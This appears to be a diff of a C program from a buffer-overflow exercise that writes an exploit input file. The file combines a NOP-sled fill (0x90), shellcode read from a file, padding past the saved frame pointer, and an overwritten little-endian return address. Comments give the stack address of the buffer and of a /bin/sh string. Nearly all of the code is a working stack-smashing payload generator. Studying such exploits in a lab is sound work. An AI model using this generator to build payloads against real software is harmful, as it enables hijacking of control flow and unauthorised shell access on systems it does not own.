@@ -4,62 +4,91 @@
 
 unsigned char* littleEndian(char *str, int numChars);
 
+// 0x7fffffffdc30 address of buf
 // 0x7ffff7b99673 address of /bin/sh/
-
 
 #define ADDR_SIZE 64
 
 int main(int argc, char *argv[]){
   FILE *file = fopen("in", "wb");
+  FILE *instFp;
+  int fileSize;
   int i;
-  char ch = 0x00;
+  char ch = 0x90;
+  char input;
   int numChars;
+  unsigned char *instFile;
   unsigned char *addr;
   unsigned char *byteAddr;
-  unsigned char *instructions;
-  unsigned char *bytes = malloc(4);
-
-  bytes[0] = 0x6f;
-  bytes[1] = 0x45;
-  bytes[2] = 0x23;
-  bytes[3] = 0x01;
 
   if(argc != 4){
     printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer] [entry_point]\n");
-    printf("Instructions: instructions to be run. Size must not exceed num_bytes_in_buffer.\n");
+    printf("Instructions: file of instructions to be run. Size must not exceed num_bytes_in_buffer. Expected to be in hex.\n");
     printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
     printf("entry_point: hex value of desired entry point, format: 0x12345678.\n");
     exit(1);
   }
 
-  instructions = argv[1];
-  numChars = atoi(argv[2]);
+  instFile = argv[1];
+  numChars = atoi(argv[2]) + 8; //add 8 bytes for fp
   addr = argv[3];
 
+  /*
   if(strlen(instructions) > numChars){
     printf("Instructions length exceeds length of buffer.");
     exit(1);
   }
+  */
+
+  instFp = fopen(instFile, "rb");
 
   if(file == NULL){
-    printf("Error opening file. Exiting");
+    printf("Error opening file. Exiting.");
     exit(1);
   }
 
-  fwrite(instructions, sizeof(char), strlen(instructions), file);
-     
-  /* fill buffer */
-  for(i = strlen(instructions); i < numChars; i++){
+  if (instFp == NULL){
+    printf("Error opening instruction file. Exiting.");
+    exit(1);
+  }
+
+  fseek(instFp, 0L, SEEK_END);
+  fileSize = ftell(instFp);
+  rewind(instFp);
+
+  printf("%d %d\n", fileSize, numChars);
+
+  if(fileSize > numChars){
+    printf("Instruction set size cannot exceed number of characters in buffer.");
+    exit(1);
+  }
+  
+  //fread(instructions, sizeof(char), fileSize, instFp);
+
+  for(i = fileSize; i < numChars; i++){
     fwrite(&ch, 1, 1, file);
   }
+    
+  
+  int j = 0;
+  while(j < fileSize){
+    input = fgetc(instFp);
+    putc(input, file);
+    j++;
+  }
+  
+  //fwrite(instructions, sizeof(char), fileSize, file);
+     
+  /* fill buffer */
+
+
 
   //-2 for the 0x at the start of the string
   byteAddr = littleEndian(addr, strlen(addr) - 2);
 
   int numWritten = fwrite(byteAddr, sizeof(char), ADDR_SIZE / 8, file);
-  //int numWritten = fwrite(bytes, sizeof(char), 4, file);
 
-  //printf("%d\n", numWritten);
+  printf("%d\n", numWritten);
   
   free(byteAddr);
 
